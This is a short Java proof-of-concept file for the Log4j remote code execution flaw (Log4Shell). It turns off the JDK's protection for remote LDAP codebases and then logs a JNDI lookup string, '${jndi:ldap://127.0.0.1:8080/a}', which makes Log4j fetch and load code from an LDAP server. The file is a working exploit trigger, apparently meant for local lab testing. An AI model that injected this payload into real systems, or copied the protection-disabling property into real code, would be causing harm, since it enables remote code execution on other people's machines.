import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.LogManager;


public class log4jRCE {
    private static final Logger logger = LogManager.getLogger(log4jRCE.class);
    public static void main(String[] args)
    {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true"); //JDK>=1.8.191 Need Set 
        logger.error("${jndi:ldap://127.0.0.1:8080/a}");
    }
}
